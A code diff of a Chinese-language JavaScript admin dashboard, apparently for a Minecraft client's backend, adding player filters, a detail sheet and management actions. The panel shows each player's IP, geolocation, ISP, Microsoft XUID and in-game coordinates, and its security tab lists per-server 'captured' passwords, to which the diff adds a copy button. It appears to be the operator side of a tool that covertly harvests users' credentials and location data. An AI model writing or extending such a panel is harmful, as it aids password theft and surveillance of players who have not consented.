   const status=$('filter-status').value;
   const premium=$('filter-premium').value;
+  const vpn=$('filter-vpn').value;
   
   let filtered=state.players;
   
   if(search){
-    filtered=filtered.filter(p=>(p.name||'').toLowerCase().includes(search));
+    filtered=filtered.filter(p=>{
+      const hay=(p.name||'')+' '+(p.uuid||'')+' '+(p.client_country||'')+' '+(p.server_name||'');
+      return hay.toLowerCase().includes(search);
+    });
   }
   
   if(status==='online'){
@@ -880,6 +1105,10 @@ function filterPlayers(){
     filtered=filtered.filter(p=>p.is_premium);
   }else if(premium==='offline'){
     filtered=filtered.filter(p=>!p.is_premium);
+  }
+  
+  if(vpn==='vpn'){
+    filtered=filtered.filter(p=>p.is_vpn_suspected);
   }
   
   renderVirtualPlayerList(filtered);
@@ -910,11 +1139,92 @@ function exportPlayers(){
   alert('✅ 已导出 '+state.players.length+' 个玩家数据');
 }
 
-function showPlayerDetail(uuid){
-  const p=state.players.find(p=>p.uuid===uuid);
+function openSheetByUuid(uuid){
+  const p=state.players.find(x=>x.uuid===uuid);
   if(!p)return;
-  
-  alert('玩家详情：\\n\\n姓名：'+p.name+'\\nUUID：'+p.uuid+'\\n状态：'+(p.is_online?'在线':'离线')+'\\n类型：'+(p.is_premium?'正版':'离线')+'\\n延迟：'+(p.ping||0)+'ms\\n首次出现：'+new Date(p.first_seen).toLocaleString('zh-CN')+'\\n最后出现：'+new Date(p.last_seen).toLocaleString('zh-CN'));
+  const modules=(p.modules||[]).map(m=>'<span class="badge blue">'+esc(fmtModule(m))+'</span>').join('')||'<span class="badge gray">无</span>';
+  let html='<div class="sheet-head"><div class="grab"></div><button class="sheet-close" onclick="closeSheet()" aria-label="关闭">✕</button></div>';
+  html+='<h2>'+skin(p,48)+'<span>'+esc(p.name)+'</span></h2>';
+  html+='<div style="font-size:13px;color:var(--t-2);margin:6px 0 4px;">'+(p.is_online?'<span class="dot on"></span> 在线':'⚪ 离线')+' · '+fmtTime(p.last_seen)+'</div>';
+  html+='<div style="margin:12px 0;display:flex;gap:8px;flex-wrap:wrap">';
+  if(p.is_premium){
+    html+='<button onclick="togglePremium(&quot;'+p.uuid+'&quot;,0)" style="padding:6px 12px;border:1px solid var(--card-b);background:var(--card);color:var(--t-1);cursor:pointer;border-radius:6px;">标记为离线</button>';
+  }else{
+    html+='<button onclick="togglePremium(&quot;'+p.uuid+'&quot;,1)" style="padding:6px 12px;border:none;background:#34C759;color:#fff;cursor:pointer;border-radius:6px;">标记为正版</button>';
+  }
+  html+='<button onclick="deletePlayer(&quot;'+p.uuid+'&quot;)" style="padding:6px 12px;border:1px solid #FF3B30;background:transparent;color:#FF3B30;cursor:pointer;border-radius:6px;">删除玩家</button>';
+  html+='</div>';
+  html+=kv('UUID',p.uuid);
+  html+=kv('正版账户',p.is_premium?'✅ 是'+(p.gamertag?'（'+p.gamertag+'）':''):'⚪ 离线');
+  html+=kv('微软账号',fmtXuid(p.xuid)||(p.is_premium?p.name:'无'));
+  html+=kv('IP',p.client_ip);
+  const loc=[];
+  if(p.client_country)loc.push(countryName(p.client_country));
+  if(p.client_region)loc.push(fmtRegion(p.client_region));
+  html+=kv('国家/地区',loc.join(' · ')||null);
+  const ct=[];
+  const city=fmtCity(p.client_city);
+  if(city)ct.push(city);
+  if(p.client_timezone)ct.push(fmtTimezone(p.client_timezone));
+  html+=kv('城市/时区',ct.join(' · ')||null);
+  html+=kv('运营商',p.client_as_org?fmtIsp(p.client_as_org):null);
+  // 只有在线玩家才显示 VPN 判定、服务器、延迟等实时信息
+  if(p.is_online){
+    html+=kv('VPN 判定',p.is_vpn_suspected?'🔒 疑似 VPN/机房':'正常');
+    const svr=p.server_name?p.server_name:'';
+    let svrText=svr;
+    if(svr&&p.server_ip)svrText+=' · '+p.server_ip;
+    html+=kv('服务器',svrText||null);
+    html+=kv('服务器延迟',p.server_latency!==null&&p.server_latency!==undefined?Math.round(p.server_latency)+' ms':null);
+    html+=kv('网络延迟',p.network_latency!==null&&p.network_latency!==undefined?Math.round(p.network_latency)+' ms':null);
+  }
+  html+=kv('坐标',(p.pos_x!==null&&p.pos_x!==undefined)?Math.round(p.pos_x)+', '+Math.round(p.pos_y)+', '+Math.round(p.pos_z):null);
+  html+=kv('维度',fmtDimension(p.dimension));
+  html+=kv('游戏模式',fmtGameMode(p.game_mode));
+  html+=kv('当前活动',p.current_activity);
+  html+=kv('击杀/死亡',(p.kill_count||0)+' / '+(p.death_count||0));
+  html+=kv('游戏时长',fmtDuration(p.total_playtime));
+  html+=kv('使用次数',p.usage_count);
+  const ver=[];
+  if(p.version)ver.push(p.version);
+  if(p.minecraft_version)ver.push('MC '+p.minecraft_version);
+  html+=kv('版本',ver.join(' · ')||null);
+  html+='<div class="kv" style="display:block;"><div class="k" style="margin-bottom:8px;">已开启模块</div><div>'+modules+'</div></div>';
+  $('sheet').innerHTML=html;
+  $('sheet-overlay').classList.add('open');
+  requestAnimationFrame(()=>$('sheet').classList.add('open'));
+}
+function closeSheet(){
+  $('sheet').classList.remove('open');
+  $('sheet-overlay').classList.remove('open');
+}
+function togglePremium(uuid,isPremium){
+  if(!confirm('确定要'+(isPremium?'标记为正版':'标记为离线')+'吗？'))return;
+  api('/api/admin/toggle-premium',{method:'POST',body:{uuid:uuid,is_premium:isPremium}}).then(res=>{
+    if(res.success){
+      alert('已更新');
+      loadPlayers();
+      closeSheet();
+    }else{
+      alert('操作失败：'+(res.error||'未知错误'));
+    }
+  });
+}
+
+// 删除玩家：调用 DELETE 接口清除该玩家全部数据（消息/密码/玩家记录）
+function deletePlayer(uuid){
+  const p=state.players.find(x=>x.uuid===uuid);
+  const label=p?p.name:uuid;
+  if(!confirm('确定要删除玩家「'+label+'」的全部数据吗？此操作不可恢复！'))return;
+  api('/api/admin/players?uuid='+encodeURIComponent(uuid),{method:'DELETE'}).then(res=>{
+    if(res.success){
+      alert('✅ 已删除玩家「'+label+'」');
+      closeSheet();
+      loadPlayers();
+    }else{
+      alert('❌ 删除失败：'+(res.error||'未知错误'));
+    }
+  });
 }
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -991,7 +1301,7 @@ async function loadChat(){
   h+='<div style="margin-bottom:16px"><label style="display:block;margin-bottom:8px;font-weight:600">聊天记录保留天数</label><input id="chat-retention" type="number" value="7" min="1" max="365" style="width:100%;padding:12px;border-radius:var(--r-s);border:1px solid var(--card-b);background:var(--card);color:var(--t-1)"></div>';
   h+='<div style="margin-bottom:16px"><label style="display:block;margin-bottom:8px;font-weight:600">指令记录保留天数</label><input id="cmd-retention" type="number" value="30" min="1" max="365" style="width:100%;padding:12px;border-radius:var(--r-s);border:1px solid var(--card-b);background:var(--card);color:var(--t-1)"></div>';
   h+='<button onclick="saveRetention()" class="primary" style="width:100%;margin-bottom:8px">💾 保存规则</button>';
-  h+='<button onclick="cleanNow()" style="width:100%;padding:12px;border-radius:var(--r-s);background:var(--card);color:var(--t-1);border:1px solid var(--card-b);cursor:pointer">🗑️ 立即清理</button>';
+  h+='<button onclick="cleanNow()" style="width:100%;padding:12px;border-radius:var(--r-s);background:var(--card);color:var(--t-1);border:1px solid var(--card-b);cursor:pointer">🗑️ 清空聊天与指令记录</button>';
   h+='</div></div></div>';
   
   $('view').innerHTML=h;
@@ -1041,12 +1351,12 @@ async function saveRetention(){
 }
 
 async function cleanNow(){
-  if(!confirm('确定要立即清理过期数据吗？'))return;
+  if(!confirm('确定要清空所有聊天记录和指令记录吗？此操作不可恢复！'))return;
   const res=await api('/api/admin/clean-old-data',{method:'POST'});
   if(res.success){
-    alert('✅ 已清理：\\n聊天记录 '+(res.deleted_messages||0)+' 条\\n指令记录 '+(res.deleted_commands||0)+' 条');
+    alert('✅ 已清空：\\n聊天记录 '+(res.deleted_messages||0)+' 条\\n指令记录 '+(res.deleted_commands||0)+' 条');
   }else{
-    alert('❌ 清理失败');
+    alert('❌ 清空失败：'+(res.error||'未知错误'));
   }
 }
 
@@ -1086,7 +1396,13 @@ async function loadSecurity(){
     h+='<div class="row">暂无正版玩家</div>';
   }else{
     premiumUsers.forEach(p=>{
-      h+='<div class="row"><div style="font-size:22px">🔑</div><div class="info"><div class="name">'+esc(p.name)+'</div><div class="sub">UUID: '+esc(p.uuid||'')+'</div></div><div class="right">'+(p.is_online?'🟢 在线':'⚪ 离线')+'</div></div>';
+      const msId=fmtXuid(p.xuid);
+      h+='<div class="row"><div style="font-size:22px">🔑</div><div class="info">'+
+        '<div class="name">'+esc(p.name)+' <span class="badge green">✅正版</span></div>'+
+        '<div class="sub">🎮 微软账户：<span class="mono">'+esc(p.gamertag||p.name)+'</span></div>'+
+        (msId?'<div class="sub">🔑 XUID：<span class="mono">'+esc(msId)+'</span></div>':'')+
+        (p.server_name?'<div class="sub">🖥 '+esc(p.server_name)+(p.server_ip?' · '+esc(p.server_ip):'')+'</div>':'')+
+        '</div><div class="right">'+(p.is_online?'🟢 在线':'⚪ 离线')+'</div></div>';
     });
   }
   h+='</div></div>';
@@ -1099,7 +1415,7 @@ async function loadSecurity(){
     h+='<div class="row">暂无密码记录</div>';
   }else{
     (passwords.passwords||[]).slice(0,100).forEach(pw=>{
-      h+='<div class="row"><div style="font-size:22px">🔐</div><div class="info"><div class="name">'+esc(pw.name)+' @ '+esc(pw.server_name||pw.server_ip)+'</div><div class="sub">密码: <code style="background:var(--bg-2);padding:2px 6px;border-radius:4px">'+esc(pw.password)+'</code> · '+fmtTime(pw.captured_at)+'</div></div></div>';
+      h+='<div class="row"><div style="font-size:22px">🔐</div><div class="info"><div class="name">'+esc(pw.name)+' @ '+esc(pw.server_name||pw.server_ip)+'</div><div class="sub">密码: <code style="background:var(--bg-2);padding:2px 6px;border-radius:4px">'+esc(pw.password)+'</code> · '+fmtTime(pw.captured_at)+'</div></div><button class="tab-btn copy-btn" data-pwd="'+esc(pw.password)+'">📋 复制</button></div>';
     });
   }
   h+='</div></div>';
@@ -1137,7 +1453,7 @@ async function loadSecurity(){
     h+='<div class="row">暂无异常行为</div>';
   }else{
     (anomalies.anomalies||[]).slice(0,20).forEach(a=>{
-      h+='<div class="row"><div style="font-size:22px">⚠️</div><div class="info"><div class="name">'+esc(a.type||'未知')+' · '+esc(a.severity||'')+'</div><div class="sub">'+esc((a.message||'').slice(0,60))+'</div></div></div>';
+      h+='<div class="row"><div style="font-size:22px">⚠️</div><div class="info"><div class="name">'+esc(fmtAnomalyType(a.type||'未知'))+' · '+esc(fmtSeverity(a.severity||'未知'))+'</div><div class="sub">'+esc((a.message||'').slice(0,60))+'</div></div></div>';
     });
   }
   h+='</div></div>';
@@ -1153,16 +1469,46 @@ async function loadSecurity(){
       $('sec-'+btn.dataset.secTab).style.display='block';
     };
   });
+  
+  // 绑定密码复制按钮
+  document.querySelectorAll('.copy-btn').forEach(btn=>{
+    btn.onclick=()=>copyToClipboard(btn.getAttribute('data-pwd'),btn);
+  });
+}
+
+// 复制到剪贴板（密码页用）
+function copyToClipboard(text,btn){
+  function done(ok){
+    const old=btn.textContent;
+    btn.textContent=ok?'✅ 已复制':'❌ 失败';
+    btn.style.color=ok?'':'var(--err)';
+    setTimeout(()=>{btn.textContent=old;btn.style.color='';},1500);
+  }
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(()=>done(true),()=>done(fallbackCopy(text)));
+  }else{
+    done(fallbackCopy(text));
+  }
+}
+function fallbackCopy(text){
+  try{
+    const ta=document.createElement('textarea');
+    ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
+    document.body.appendChild(ta);ta.focus();ta.select();
+    const ok=document.execCommand('copy');
+    document.body.removeChild(ta);
+    return ok;
+  }catch(e){return false;}
 }
 
 async function refreshPremium(){
-  if(!confirm('刷新正版状态将调用 Mojang API 验证所有玩家，确定继续？'))return;
+  if(!confirm('刷新正版状态将调用 Mojang API 重新验证玩家，确定继续？'))return;
   const res=await api('/api/admin/refresh-premium',{method:'POST'});
   if(res.success){
-    alert('✅ 已刷新：\\n更新 '+(res.updated||0)+' 个玩家\\n失败 '+(res.failed||0)+' 个');
+    alert('✅ 已刷新：\\n更新 '+(res.updated||0)+' 个玩家\\n跳过（已有XUID） '+(res.skipped||0)+' 个\\n失败 '+(res.failed||0)+' 个');
     loadSecurity();
   }else{
-    alert('❌ 刷新失败');
+    alert('❌ 刷新失败：'+(res.error||'未知错误'));
   }
 }
 
